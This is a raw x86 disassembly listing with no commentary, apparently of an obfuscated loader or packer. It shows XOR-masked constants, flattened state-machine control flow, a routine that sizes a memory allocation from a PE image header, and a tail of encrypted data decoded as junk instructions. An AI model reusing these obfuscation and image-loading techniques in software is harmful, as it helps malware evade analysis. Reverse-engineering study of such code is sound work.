  41df1b:	mov    DWORD PTR [ebp-0x18],eax
  41df1e:	mov    eax,DWORD PTR [ebp+0xc]
  41df21:	mov    ecx,DWORD PTR [ebp+0xc]
  41df24:	mov    eax,DWORD PTR [eax+0x10]
  41df27:	add    eax,DWORD PTR [ecx+0xc]
  41df2a:	mov    ecx,DWORD PTR [ebp-0x18]
  41df2d:	cmp    ecx,eax
  41df2f:	jb     0x41df47
  41df31:	mov    eax,DWORD PTR [ebp+0xc]
  41df34:	mov    eax,DWORD PTR [eax+0xc]
  41df37:	mov    ecx,DWORD PTR [ebp+0xc]
  41df3a:	add    eax,DWORD PTR [ecx+0x8]
  41df3d:	mov    ecx,DWORD PTR [ebp-0x18]
  41df40:	sub    eax,ecx
  41df42:	jmp    0x41e235
  41df47:	push   0xc
  41df49:	push   DWORD PTR [ebp-0x4]
  41df4c:	lea    eax,[ebp-0x4c]
  41df4f:	push   eax
  41df50:	call   0x41d455
  41df55:	mov    eax,0xf89c85b9
  41df5a:	mov    DWORD PTR [ebp-0x2c],eax
  41df5d:	mov    DWORD PTR [ebp-0x30],0xf89c85b8
  41df64:	mov    DWORD PTR [ebp-0x34],0xf89c85bb
  41df6b:	mov    DWORD PTR [ebp-0x38],0xf89c85ba
  41df72:	lea    ecx,[ebp-0x2c]
  41df75:	mov    DWORD PTR [ebp-0xc],ecx
  41df78:	lea    ecx,[ebp-0x30]
  41df7b:	mov    DWORD PTR [ebp-0x10],ecx
  41df7e:	lea    ecx,[ebp-0x34]
  41df81:	mov    DWORD PTR [ebp+0xc],ecx
  41df84:	lea    ecx,[ebp-0x38]
  41df87:	mov    DWORD PTR [ebp-0x14],ecx
  41df8a:	mov    ecx,DWORD PTR [ebp+0x8]
  41df8d:	xor    ecx,edi
  41df8f:	add    ecx,ebx
  41df91:	mov    DWORD PTR [ebp-0x18],ecx
  41df94:	jmp    0x41e190
  41df99:	cmp    eax,0xf89c85bb
  41df9e:	je     0x41e1a2
  41dfa4:	mov    ecx,DWORD PTR [ebp-0x8]
  41dfa7:	xor    ecx,edi
  41dfa9:	mov    esi,eax
  41dfab:	add    ecx,ebx
  41dfad:	mov    DWORD PTR [ebp+0x18],ecx
  41dfb0:	mov    eax,DWORD PTR [ebp-0x18]
  41dfb3:	xor    esi,edi
  41dfb5:	lea    eax,[eax+esi*1+0x3272e0]
  41dfbc:	mov    DWORD PTR [ebp-0x18],eax
  41dfbf:	mov    eax,DWORD PTR [ebp-0x8]
  41dfc2:	mov    ecx,DWORD PTR [ebp-0x18]
  41dfc5:	xor    eax,edi
  41dfc7:	add    eax,ebx
  41dfc9:	cmp    ecx,eax
  41dfcb:	jne    0x41dfe0
  41dfcd:	mov    eax,DWORD PTR [ebp+0x8]
  41dfd0:	xor    eax,edi
  41dfd2:	add    eax,ebx
  41dfd4:	push   eax
  41dfd5:	push   0xc
  41dfd7:	lea    eax,[ebp-0x4c]
  41dfda:	push   eax
  41dfdb:	call   0x41d9e2
  41dfe0:	mov    eax,DWORD PTR [ebp-0xc]
  41dfe3:	mov    eax,DWORD PTR [eax]
  41dfe5:	xor    eax,edi
  41dfe7:	mov    al,BYTE PTR [ebp+eax*1+0x327294]
  41dfee:	mov    ecx,DWORD PTR [ebp+0x8]
  41dff1:	xor    ecx,edi
  41dff3:	movzx  eax,al
  41dff6:	add    ecx,ebx
  41dff8:	cmp    eax,ecx
  41dffa:	je     0x41e178
  41e000:	mov    eax,DWORD PTR [ebp-0x10]
  41e003:	mov    eax,DWORD PTR [eax]
  41e005:	xor    eax,edi
  41e007:	mov    al,BYTE PTR [ebp+eax*1+0x327294]
  41e00e:	mov    ecx,DWORD PTR [ebp+0x8]
  41e011:	xor    ecx,edi
  41e013:	movzx  eax,al
  41e016:	add    ecx,ebx
  41e018:	cmp    eax,ecx
  41e01a:	je     0x41e178
  41e020:	mov    eax,DWORD PTR [ebp+0xc]
  41e023:	mov    eax,DWORD PTR [eax]
  41e025:	xor    eax,edi
  41e027:	mov    al,BYTE PTR [ebp+eax*1+0x327294]
  41e02e:	mov    ecx,DWORD PTR [ebp+0x8]
  41e031:	xor    ecx,edi
  41e033:	movzx  eax,al
  41e036:	add    ecx,ebx
  41e038:	cmp    eax,ecx
  41e03a:	je     0x41e178
  41e040:	mov    eax,DWORD PTR [ebp-0x14]
  41e043:	mov    eax,DWORD PTR [eax]
  41e045:	xor    eax,edi
  41e047:	mov    al,BYTE PTR [ebp+eax*1+0x327294]
  41e04e:	mov    ecx,DWORD PTR [ebp+0x8]
  41e051:	xor    ecx,edi
  41e053:	movzx  eax,al
  41e056:	add    ecx,ebx
  41e058:	cmp    eax,ecx
  41e05a:	je     0x41e178
  41e060:	mov    eax,DWORD PTR [ebp-0x10]
  41e063:	mov    eax,DWORD PTR [eax]
  41e065:	xor    eax,edi
  41e067:	mov    al,BYTE PTR [ebp+eax*1+0x327294]
  41e06e:	mov    ecx,DWORD PTR [ebp-0xc]
  41e071:	mov    ecx,DWORD PTR [ecx]
  41e073:	xor    ecx,edi
  41e075:	mov    cl,BYTE PTR [ebp+ecx*1+0x327294]
  41e07c:	xor    al,cl
  41e07e:	mov    ecx,DWORD PTR [ebp+0xc]
  41e081:	mov    ecx,DWORD PTR [ecx]
  41e083:	xor    ecx,edi
  41e085:	mov    cl,BYTE PTR [ebp+ecx*1+0x327294]
  41e08c:	or     al,cl
  41e08e:	mov    ecx,DWORD PTR [ebp-0xc]
  41e091:	mov    ecx,DWORD PTR [ecx]
  41e093:	xor    ecx,edi
  41e095:	mov    cl,BYTE PTR [ebp+ecx*1+0x327298]
  41e09c:	cmp    cl,al
  41e09e:	jne    0x41e178
  41e0a4:	mov    eax,DWORD PTR [ebp+0xc]
  41e0a7:	mov    eax,DWORD PTR [eax]
  41e0a9:	xor    eax,edi
  41e0ab:	mov    al,BYTE PTR [ebp+eax*1+0x327294]
  41e0b2:	mov    ecx,DWORD PTR [ebp-0x10]
  41e0b5:	mov    ecx,DWORD PTR [ecx]
  41e0b7:	xor    ecx,edi
  41e0b9:	mov    cl,BYTE PTR [ebp+ecx*1+0x327294]
  41e0c0:	xor    al,cl
  41e0c2:	mov    ecx,DWORD PTR [ebp-0x14]
  41e0c5:	mov    ecx,DWORD PTR [ecx]
  41e0c7:	xor    ecx,edi
  41e0c9:	mov    cl,BYTE PTR [ebp+ecx*1+0x327294]
  41e0d0:	or     al,cl
  41e0d2:	mov    ecx,DWORD PTR [ebp-0x10]
  41e0d5:	mov    ecx,DWORD PTR [ecx]
  41e0d7:	xor    ecx,edi
  41e0d9:	mov    cl,BYTE PTR [ebp+ecx*1+0x327298]
  41e0e0:	cmp    cl,al
  41e0e2:	jne    0x41e178
  41e0e8:	mov    eax,DWORD PTR [ebp-0x14]
  41e0eb:	mov    eax,DWORD PTR [eax]
  41e0ed:	xor    eax,edi
  41e0ef:	mov    al,BYTE PTR [ebp+eax*1+0x327294]
  41e0f6:	mov    ecx,DWORD PTR [ebp+0xc]
  41e0f9:	mov    ecx,DWORD PTR [ecx]
  41e0fb:	xor    ecx,edi
  41e0fd:	mov    cl,BYTE PTR [ebp+ecx*1+0x327294]
  41e104:	xor    al,cl
  41e106:	mov    ecx,DWORD PTR [ebp-0xc]
  41e109:	mov    ecx,DWORD PTR [ecx]
  41e10b:	xor    ecx,edi
  41e10d:	mov    cl,BYTE PTR [ebp+ecx*1+0x327294]
  41e114:	or     al,cl
  41e116:	mov    ecx,DWORD PTR [ebp+0xc]
  41e119:	mov    ecx,DWORD PTR [ecx]
  41e11b:	xor    ecx,edi
  41e11d:	mov    cl,BYTE PTR [ebp+ecx*1+0x327298]
  41e124:	cmp    cl,al
  41e126:	jne    0x41e178
  41e128:	mov    eax,DWORD PTR [ebp-0x14]
  41e12b:	mov    eax,DWORD PTR [eax]
  41e12d:	xor    eax,edi
  41e12f:	mov    al,BYTE PTR [ebp+eax*1+0x327294]
  41e136:	mov    ecx,DWORD PTR [ebp-0xc]
  41e139:	mov    ecx,DWORD PTR [ecx]
  41e13b:	xor    ecx,edi
  41e13d:	mov    cl,BYTE PTR [ebp+ecx*1+0x327294]
  41e144:	xor    al,cl
  41e146:	mov    ecx,DWORD PTR [ebp-0x10]
  41e149:	mov    ecx,DWORD PTR [ecx]
  41e14b:	xor    ecx,edi
  41e14d:	mov    cl,BYTE PTR [ebp+ecx*1+0x327294]
  41e154:	or     al,cl
  41e156:	mov    ecx,DWORD PTR [ebp-0x14]
  41e159:	mov    ecx,DWORD PTR [ecx]
  41e15b:	xor    ecx,edi
  41e15d:	mov    cl,BYTE PTR [ebp+ecx*1+0x327298]
  41e164:	cmp    cl,al
  41e166:	jne    0x41e178
  41e168:	lea    eax,[ebp-0x4c]
  41e16b:	push   eax
  41e16c:	call   0x41dc33
  41e171:	mov    ecx,DWORD PTR [ebp-0x44]
  41e174:	cmp    eax,ecx
  41e176:	je     0x41e182
  41e178:	mov    eax,DWORD PTR [ebp+0x8]
  41e17b:	xor    eax,edi
  41e17d:	add    eax,ebx
  41e17f:	mov    DWORD PTR [ebp+0x18],eax
  41e182:	mov    eax,DWORD PTR [ebp-0x8]
  41e185:	xor    eax,edi
  41e187:	lea    eax,[eax+esi*1+0x3272e0]
  41e18e:	xor    eax,edi
  41e190:	mov    ecx,DWORD PTR [ebp+0x8]
  41e193:	mov    edx,DWORD PTR [ebp+0x18]
  41e196:	xor    ecx,edi
  41e198:	add    ecx,ebx
  41e19a:	cmp    edx,ecx
  41e19c:	je     0x41df99
  41e1a2:	mov    eax,DWORD PTR [ebp+0x8]
  41e1a5:	mov    ecx,DWORD PTR [ebp+0x18]
  41e1a8:	xor    eax,edi
  41e1aa:	add    eax,ebx
  41e1ac:	cmp    ecx,eax
  41e1ae:	jne    0x41e1c1
  41e1b0:	mov    eax,DWORD PTR [ebp-0x8]
  41e1b3:	mov    ecx,DWORD PTR [ebp+0x1c]
  41e1b6:	xor    eax,edi
  41e1b8:	lea    eax,[eax+ecx*1+0x3272e0]
  41e1bf:	jmp    0x41e238
  41e1c1:	push   0x18
  41e1c3:	push   DWORD PTR [ebp-0x4]
  41e1c6:	lea    eax,[ebp-0x64]
  41e1c9:	push   eax
  41e1ca:	call   0x41d455
  41e1cf:	mov    eax,DWORD PTR [ebp+0x8]
  41e1d2:	mov    ecx,DWORD PTR [ebp-0x18]
  41e1d5:	xor    eax,edi
  41e1d7:	add    eax,ebx
  41e1d9:	cmp    eax,ecx
  41e1db:	je     0x41e1f0
  41e1dd:	mov    eax,DWORD PTR [ebp+0x8]
  41e1e0:	xor    eax,edi
  41e1e2:	add    eax,ebx
  41e1e4:	push   eax
  41e1e5:	push   0x18
  41e1e7:	lea    eax,[ebp-0x64]
  41e1ea:	push   eax
  41e1eb:	call   0x41d9e2
  41e1f0:	mov    eax,DWORD PTR [ebp-0x4]
  41e1f3:	add    eax,0x18
  41e1f6:	mov    DWORD PTR [ebp+0x18],eax
  41e1f9:	push   DWORD PTR [ebp-0x50]
  41e1fc:	push   DWORD PTR [ebp+0x18]
  41e1ff:	mov    eax,DWORD PTR [ebp-0x54]
  41e202:	add    eax,DWORD PTR [ebp-0x20]
  41e205:	push   eax
  41e206:	call   0x41d455
  41e20b:	mov    eax,DWORD PTR [ebp+0x8]
  41e20e:	mov    ecx,DWORD PTR [ebp-0x18]
  41e211:	xor    eax,edi
  41e213:	add    eax,ebx
  41e215:	cmp    eax,ecx
  41e217:	je     0x41e22a
  41e219:	push   0x0
  41e21b:	push   DWORD PTR [ebp-0x50]
  41e21e:	mov    eax,DWORD PTR [ebp-0x54]
  41e221:	add    eax,DWORD PTR [ebp-0x20]
  41e224:	push   eax
  41e225:	call   0x41d9e2
  41e22a:	mov    eax,DWORD PTR [ebp-0x24]
  41e22d:	mov    ecx,DWORD PTR [ebp-0x50]
  41e230:	add    DWORD PTR [eax],ecx
  41e232:	mov    eax,DWORD PTR [ebp-0x50]
  41e235:	add    eax,DWORD PTR [ebp+0x1c]
  41e238:	mov    DWORD PTR [ebp+0x1c],eax
  41e23b:	mov    eax,DWORD PTR [ebp-0x8]
  41e23e:	mov    ecx,DWORD PTR [ebp+0x1c]
  41e241:	xor    eax,edi
  41e243:	add    eax,ebx
  41e245:	imul   eax,ecx
  41e248:	mov    ecx,DWORD PTR [ebp+0x8]
  41e24b:	mov    edx,DWORD PTR [ebp-0x28]
  41e24e:	xor    ecx,edi
  41e250:	lea    ecx,[ecx+edx*1+0x3272e0]
  41e257:	cmp    eax,ecx
  41e259:	jb     0x41deb7
  41e25f:	mov    esi,DWORD PTR [ebp+0x14]
  41e262:	mov    eax,DWORD PTR [ebp-0x20]
  41e265:	mov    DWORD PTR [esi],eax
  41e267:	jmp    0x41e2ae
  41e269:	mov    ecx,DWORD PTR [ebp+0x8]
  41e26c:	mov    edx,DWORD PTR [ebp+0xc]
  41e26f:	xor    ecx,edi
  41e271:	xor    edx,edi
  41e273:	add    ecx,ebx
  41e275:	add    edx,ebx
  41e277:	cmp    ecx,edx
  41e279:	jne    0x41e28d
  41e27b:	mov    eax,ds:0x7f642d1e
  41e280:	imul   eax,eax,0x9f15fcef
  41e286:	mov    ds:0x7f642d1e,eax
  41e28b:	jmp    0x41e2ae
  41e28d:	mov    ecx,DWORD PTR [ebp+0x8]
  41e290:	xor    ecx,edi
  41e292:	add    ecx,ebx
  41e294:	cmp    eax,ecx
  41e296:	je     0x41e2a4
  41e298:	sub    DWORD PTR ds:0xf861e3e,0x709beac2
  41e2a2:	jmp    0x41e2ae
  41e2a4:	and    DWORD PTR ds:0x3343fa1e,0x5265ec3f
  41e2ae:	pop    edi
  41e2af:	pop    esi
  41e2b0:	pop    ebx
  41e2b1:	leave  
  41e2b2:	ret    0x18
  41e2b5:	push   ebp
  41e2b6:	mov    ebp,esp
  41e2b8:	and    esp,0xfffffff8
  41e2bb:	mov    eax,DWORD PTR [ebp+0x20]
  41e2be:	sub    esp,0x14
  41e2c1:	push   ebx
  41e2c2:	mov    ebx,DWORD PTR [ebp+0x14]
  41e2c5:	push   esi
  41e2c6:	push   edi
  41e2c7:	cmp    eax,0xf89c85b9
  41e2cc:	jne    0x41e2d8
  41e2ce:	push   0xf89c85b8
  41e2d3:	jmp    0x41e40a
  41e2d8:	mov    eax,DWORD PTR [ebp+0x20]
  41e2db:	cmp    eax,0xf89c85b8
  41e2e0:	jne    0x41e2ec
  41e2e2:	push   0xf89c85bb
  41e2e7:	jmp    0x41e40a
  41e2ec:	mov    eax,DWORD PTR [ebp+0x20]
  41e2ef:	cmp    eax,0xf89c85bb
  41e2f4:	jne    0x41e300
  41e2f6:	push   0xf89c85ba
  41e2fb:	jmp    0x41e40a
  41e300:	mov    eax,DWORD PTR [ebp+0x20]
  41e303:	cmp    eax,0xf89c85ba
  41e308:	jne    0x41e314
  41e30a:	push   0xf89c85bd
  41e30f:	jmp    0x41e40a
  41e314:	mov    ecx,DWORD PTR [ebp+0x20]
  41e317:	mov    eax,0xf89c85be
  41e31c:	cmp    ecx,eax
  41e31e:	jne    0x41e3da
  41e324:	mov    eax,DWORD PTR [ebp+0x10]
  41e327:	mov    DWORD PTR [esp+0xc],eax
  41e32b:	mov    eax,DWORD PTR [ebp+0x18]
  41e32e:	mov    DWORD PTR [esp+0x14],eax
  41e332:	mov    eax,DWORD PTR [ebp+0xc]
  41e335:	mov    DWORD PTR [esp+0x18],eax
  41e339:	mov    eax,DWORD PTR [ebp+0x8]
  41e33c:	mov    DWORD PTR [esp+0x10],eax
  41e340:	mov    eax,DWORD PTR [esp+0x10]
  41e344:	mov    ecx,DWORD PTR [esp+0x14]
  41e348:	mov    edi,0x7510899
  41e34d:	xor    eax,edi
  41e34f:	mov    esi,0x3272e0
  41e354:	add    eax,esi
  41e356:	mov    DWORD PTR [ecx],eax
  41e358:	mov    eax,DWORD PTR [esp+0xc]
  41e35c:	mov    eax,DWORD PTR [eax+0x194]
  41e362:	mov    ecx,DWORD PTR [eax]
  41e364:	mov    eax,DWORD PTR [esp+0xc]
  41e368:	mov    eax,DWORD PTR [eax+0x194]
  41e36e:	mov    eax,DWORD PTR [eax]
  41e370:	add    eax,DWORD PTR [ecx+0x3c]
  41e373:	mov    ecx,DWORD PTR [esp+0xc]
  41e377:	mov    ecx,DWORD PTR [ecx+0x1d8]
  41e37d:	mov    ecx,DWORD PTR [ecx+0x14]
  41e380:	push   0x4
  41e382:	push   0x3000
  41e387:	push   DWORD PTR [eax+0x50]
  41e38a:	push   0x0
  41e38c:	call   ecx
  41e38e:	mov    DWORD PTR [ebx],eax
  41e390:	mov    eax,DWORD PTR [esp+0x10]
  41e394:	push   DWORD PTR [esp+0xc]
  41e398:	xor    eax,edi
  41e39a:	add    eax,esi
  41e39c:	mov    DWORD PTR [esp+0x20],eax
  41e3a0:	lea    eax,[esp+0x20]
  41e3a4:	push   eax
  41e3a5:	push   ebx
  41e3a6:	push   DWORD PTR [esp+0x20]
  41e3aa:	push   DWORD PTR [esp+0x28]
  41e3ae:	push   DWORD PTR [esp+0x24]
  41e3b2:	call   0x41dd77
  41e3b7:	mov    eax,DWORD PTR [esp+0x10]
  41e3bb:	mov    ecx,DWORD PTR [ebx]
  41e3bd:	xor    eax,edi
  41e3bf:	add    eax,esi
  41e3c1:	cmp    ecx,eax
  41e3c3:	je     0x41e421
  41e3c5:	mov    eax,DWORD PTR [esp+0x18]
  41e3c9:	mov    ecx,DWORD PTR [esp+0x14]
  41e3cd:	xor    eax,edi
  41e3cf:	add    eax,esi
  41e3d1:	imul   eax,DWORD PTR [esp+0x1c]
  41e3d6:	mov    DWORD PTR [ecx],eax
  41e3d8:	jmp    0x41e421
  41e3da:	mov    ecx,DWORD PTR [ebp+0x20]
  41e3dd:	cmp    ecx,0xf89c85bd
  41e3e3:	jne    0x41e3ec
  41e3e5:	push   0xf89c85bc
  41e3ea:	jmp    0x41e40a
  41e3ec:	mov    ecx,DWORD PTR [ebp+0x20]
  41e3ef:	cmp    ecx,0xf89c85bc
  41e3f5:	jne    0x41e3fe
  41e3f7:	push   0xf89c85bf
  41e3fc:	jmp    0x41e40a
  41e3fe:	mov    ecx,DWORD PTR [ebp+0x20]
  41e401:	cmp    ecx,0xf89c85bf
  41e407:	jne    0x41e421
  41e409:	push   eax
  41e40a:	push   DWORD PTR [ebp+0x1c]
  41e40d:	push   DWORD PTR [ebp+0x18]
  41e410:	push   ebx
  41e411:	push   DWORD PTR [ebp+0x10]
  41e414:	push   DWORD PTR [ebp+0xc]
  41e417:	push   DWORD PTR [ebp+0x8]
  41e41a:	call   0x41e2b5
  41e41f:	mov    DWORD PTR [ebx],eax
  41e421:	mov    eax,DWORD PTR [ebx]
  41e423:	pop    edi
  41e424:	pop    esi
  41e425:	pop    ebx
  41e426:	mov    esp,ebp
  41e428:	pop    ebp
  41e429:	ret    0x1c
  41e42c:	push   ebp
  41e42d:	mov    ebp,esp
  41e42f:	sub    esp,0xc
  41e432:	mov    eax,0xf89c85b9
  41e437:	mov    DWORD PTR [ebp-0x8],eax
  41e43a:	mov    DWORD PTR [ebp-0xc],0xf89c85b8
  41e441:	mov    ecx,DWORD PTR [ebp-0x8]
  41e444:	xor    ecx,0x7510899
  41e44a:	add    ecx,0x3272e0
  41e450:	mov    DWORD PTR [ebp-0x4],ecx
  41e453:	mov    ecx,DWORD PTR [ebp+0xc]
  41e456:	push   eax
  41e457:	mov    DWORD PTR [ebp+0xc],ecx
  41e45a:	push   DWORD PTR [ebp+0xc]
  41e45d:	lea    eax,[ebp-0x4]
  41e460:	push   DWORD PTR [ebp+0x8]
  41e463:	push   eax
  41e464:	push   DWORD PTR [ebp+0xc]
  41e467:	push   DWORD PTR [ebp-0xc]
  41e46a:	push   DWORD PTR [ebp-0x8]
  41e46d:	call   0x41e2b5
  41e472:	mov    DWORD PTR [ebp-0x4],eax
  41e475:	mov    eax,DWORD PTR [ebp-0x4]
  41e478:	leave  
  41e479:	ret    0x8
  41e47c:	jg     0x41e432
  41e47e:	jge    0xf741a453
  41e484:	xor    BYTE PTR [ebp-0x3a426e92],0x3
  41e48b:	in     eax,dx
  41e48c:	clc    
  41e48d:	popa   
  41e48e:	add    DWORD PTR [eax],eax
  41e490:	test   DWORD PTR [edx],eax
  41e492:	add    BYTE PTR [eax],al
  41e494:	pusha  
  41e495:	dec    esi
  41e496:	call   0x154bfddf
  41e49b:	mov    eax,ds:0x165659d2
  41e4a0:	ficomp DWORD PTR [ecx-0x71e55462]
  41e4a6:	js     0x41e525
  41e4a8:	sbb    BYTE PTR [ecx-0x3ba9bf3],0xbf
  41e4af:	mov    ebp,0xabfb9e00
  41e4b4:	cmc    
  41e4b5:	rcl    DWORD PTR [ecx],0xd2
  41e4b8:	pop    ebx
  41e4b9:	stc    
  41e4ba:	out    0x3a,al
  41e4bc:	or     DWORD PTR ds:0x9c849e24,edi
  41e4c2:	fidivr DWORD PTR [ebp*8+0x400202cc]
  41e4c9:	bnd call 0x36dd31a0
  41e4cf:	pop    ss
  41e4d0:	(bad)  
  41e4d1:	pop    edx
  41e4d2:	adc    al,0xf9
  41e4d4:	and    al,0x8e
  41e4d6:	sahf   
  41e4d7:	out    0x8d,al
  41e4d9:	fcmovnb st,st(2)
  41e4db:	js     0x41e4f3
  41e4dd:	daa    
  41e4de:	xchg   esi,eax
  41e4df:	or     cl,bh
  41e4e1:	or     DWORD PTR [ecx-0x48],eax
  41e4e4:	or     ebp,ebp
  41e4e6:	or     eax,0x7f726318
  41e4eb:	ret    
  41e4ec:	add    dl,BYTE PTR ds:0xe2d1f32b
  41e4f2:	xor    eax,edx
  41e4f4:	xor    dl,BYTE PTR ds:0x187fd0cc
  41e4fa:	xor    DWORD PTR [esi+0x4b],edi
  41e4fd:	dec    eax
  41e4fe:	xchg   ebx,eax
  41e4ff:	mov    WORD PTR [esi+0x709c7bd8],ss
  41e505:	xchg   esi,eax
  41e506:	div    DWORD PTR [edx]
  41e508:	popa   
  41e509:	ja     0x41e511
  41e50b:	das    
  41e50c:	jmp    0x335a485d
  41e511:	push   ebx
  41e512:	lods   al,BYTE PTR ds:[esi]
  41e513:	ins    DWORD PTR es:[edi],dx
  41e514:	bound  ebp,QWORD PTR [eax+0x7d]
  41e517:	mov    edi,esp
  41e519:	ins    BYTE PTR es:[edi],dx
  41e51a:	push   edi
  41e51b:	pop    esi
  41e51c:	repz push cs
  41e51e:	sbb    ah,BYTE PTR [eax+0x8]
  41e521:	jle    0x41e531
  41e523:	cmp    BYTE PTR [ebx],0xab
  41e526:	fisttp DWORD PTR [eax-0x37]
  41e529:	push   ecx
  41e52a:	sub    ebx,esi
  41e52c:	adc    edi,DWORD PTR [esi]
  41e52e:	mov    eax,0xe59b0c31
  41e533:	pop    eax
  41e534:	jp     0x41e5a6
  41e536:	push   cs
  41e537:	xor    al,0xdf
  41e539:	pop    ecx
  41e53a:	jmp    0xe3ed:0x39956ed3
  41e541:	cmp    dh,BYTE PTR [ebx]
  41e543:	ds in  eax,0x40
  41e546:	mov    al,ds:0xada93382
  41e54b:	js     0x41e595
  41e54d:	push   edi
  41e54e:	xor    BYTE PTR [edx+ecx*4-0x3f7d69d9],dl
  41e555:	imul   edx,ebp,0x3a
  41e558:	fs idiv bh
  41e55b:	aad    0xbc
  41e55d:	mov    ebp,0xf8fca66d
  41e562:	add    ebp,esp
  41e564:	jns    0x41e5ce
  41e566:	pop    es
  41e567:	aad    0x56
  41e569:	into   
  41e56a:	add    edi,DWORD PTR [ebx+ebx*2+0x102b65d0]
  41e571:	xchg   edx,eax
  41e572:	iret   
  41e573:	jo     0x41e5a6
  41e575:	jbe    0x41e5f5
  41e577:	fdivr  st(2),st
  41e579:	jo     0x41e5e7
  41e57b:	mov    eax,ds:0xde2a8ea1
  41e580:	adc    al,0xab
  41e582:	repnz scas eax,DWORD PTR es:[edi]
  41e584:	dec    ebp
  41e585:	(bad)  
  41e586:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e587:	call   0x5e23:0x388874b
  41e58e:	jecxz  0x41e5b2
  41e590:	aas    
  41e591:	enter  0xee60,0x6
  41e595:	out    dx,al
  41e596:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e597:	adc    al,0x3b
  41e599:	sar    BYTE PTR [ebx-0x10b78e67],1
  41e59f:	adc    BYTE PTR [ebx+esi*2+0x75eb0030],0x9
  41e5a7:	and    BYTE PTR [ecx+0x7c680be0],bh
  41e5ad:	fdivr  DWORD PTR [ecx]
  41e5af:	mov    esp,0x43d6a73e
  41e5b4:	push   0x89153cf9
  41e5b9:	sahf   
  41e5ba:	push   esp
  41e5bb:	clc    
  41e5bc:	ror    DWORD PTR [eax],cl
  41e5be:	sbb    al,0xf1
  41e5c0:	jne    0x41e59f
  41e5c2:	adc    DWORD PTR [esp+ebp*1],ecx
  41e5c5:	stc    
  41e5c6:	or     bh,BYTE PTR [ebp-0x6]
  41e5c9:	add    eax,0x19990160
  41e5ce:	mov    ebp,0xa3348ab1
  41e5d3:	push   0xffffffac
  41e5d5:	lods   al,BYTE PTR ds:[esi]
  41e5d6:	lahf   
  41e5d7:	add    BYTE PTR [esi+0x63],0x92
  41e5db:	int    0x67
  41e5dd:	fidiv  DWORD PTR [edi]
  41e5df:	pop    esp
  41e5e0:	and    DWORD PTR [ebp+esi*2+0x77],eax
  41e5e4:	inc    eax
  41e5e5:	mov    dl,BYTE PTR [ebx+0x2b709752]
  41e5eb:	(bad)  
  41e5ec:	cmp    DWORD PTR [eax-0x56],edi
  41e5ef:	out    dx,eax
  41e5f0:	dec    esi
  41e5f1:	mov    ch,0x6a
  41e5f3:	pop    ebx
  41e5f4:	loopne 0x41e5ca
  41e5f6:	(bad)  
  41e5f7:	ds jbe 0x41e5b4
  41e5fa:	xchg   ebx,eax
  41e5fb:	scas   al,BYTE PTR es:[edi]
  41e5fc:	mov    ecx,DWORD PTR [ecx]
  41e5fe:	sub    esi,DWORD PTR [eax+0x1c9ada50]
  41e604:	sbb    eax,DWORD PTR [ebp+ebx*4+0xf88e006]
  41e60b:	rcl    DWORD PTR [edx+0x11],cl
  41e60e:	jle    0x41e689
  41e610:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e611:	sub    DWORD PTR [ecx],0x8e2af8d9
  41e617:	(bad)  
  41e618:	fnsetpm(287 only) 
  41e61a:	dec    ebp
  41e61b:	sahf   
  41e61c:	out    0x65,al
  41e61e:	or     BYTE PTR [ecx],cl
  41e620:	or     dl,BYTE PTR [ecx+0x6598c444]
  41e626:	arpl   WORD PTR [edx+0x7d],cx
  41e629:	lea    ecx,[esi+0x4d]
  41e62c:	std    
  41e62d:	(bad)  
  41e62e:	les    edi,FWORD PTR [edx]
  41e630:	es mov edx,0xe9b1706d
  41e636:	add    DWORD PTR [edx],0x3ffc1179
  41e63c:	iret   
  41e63d:	daa    
  41e63e:	and    BYTE PTR [eax],dh
  41e640:	pop    ecx
  41e641:	rcl    DWORD PTR [edi],0xc0
  41e644:	pop    es
  41e645:	pop    ebx
  41e646:	add    DWORD PTR [eax],ecx
  41e648:	jmp    0x979c:0xb91a2893
  41e64f:	lahf   
  41e650:	pop    ds
  41e651:	xchg   esp,eax
  41e652:	mov    cl,0x6e
  41e654:	push   ebx
  41e655:	nop
  41e656:	push   ebx
  41e657:	repnz or al,0x68
  41e65a:	in     eax,dx
  41e65b:	jmp    0x591a9121
  41e660:	(bad)  
  41e661:	inc    edx
  41e662:	lods   al,BYTE PTR ds:[esi]
  41e663:	mov    DWORD PTR [edx+0x547eeae4],0xabeed04e
  41e66d:	push   0xffffff84
  41e66f:	rcl    DWORD PTR [ebx*1-0x39950156],0xa2
  41e677:	(bad)  
  41e679:	push   es
  41e67a:	das    
  41e67b:	int    0x2f
  41e67d:	sbb    ebx,DWORD PTR [esi-0x64]
  41e680:	jp     0x41e664
  41e682:	nop
  41e683:	xor    al,0x1b
  41e685:	mov    cl,0x59
  41e687:	push   edi
  41e688:	xchg   ebx,eax
  41e689:	rcr    ebp,cl
  41e68b:	clc    
  41e68c:	or     BYTE PTR [ebp+0x3c],bh
  41e68f:	(bad)  
  41e690:	mov    ebp,0x725f5838
  41e695:	push   edx
  41e696:	(bad)  
  41e697:	retf   
  41e698:	icebp  
  41e699:	es div cl
  41e69c:	inc    esi
  41e69d:	cmp    BYTE PTR [edx],0x3d
  41e6a0:	(bad)  
  41e6a1:	cli    
  41e6a2:	pop    edi
  41e6a3:	out    0x5,al
  41e6a5:	sbb    eax,0xbdc5abaa
  41e6ab:	pop    edi
  41e6ac:	scas   eax,DWORD PTR es:[edi]
  41e6ad:	sub    BYTE PTR [ecx],bh
  41e6af:	inc    ecx
  41e6b0:	pushf  
  41e6b1:	sti    
  41e6b2:	mov    al,ds:0xc979f859
  41e6b7:	mov    BYTE PTR [esi],al
  41e6b9:	js     0x41e6d5
  41e6bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e6bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e6bd:	sbb    DWORD PTR [edi+0x47],ecx
  41e6c0:	ds out dx,al
  41e6c2:	mov    cl,0xda
  41e6c4:	je     0x41e68e
  41e6c6:	frstor [ecx+0x2427bf0c]
  41e6cc:	nop
  41e6cd:	dec    ebp
  41e6ce:	ss das 
  41e6d0:	fwait
  41e6d1:	or     edx,DWORD PTR [ebp+esi*4-0x64]
  41e6d5:	xor    al,0xef
  41e6d7:	push   edi
  41e6d8:	and    eax,0x1c73945e
  41e6dd:	mov    ds,WORD PTR [esp+edx*4]
  41e6e0:	cmp    dl,cl
  41e6e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e6e3:	push   es
  41e6e4:	add    ecx,ebp
  41e6e6:	dec    edx
  41e6e7:	ss dec edi
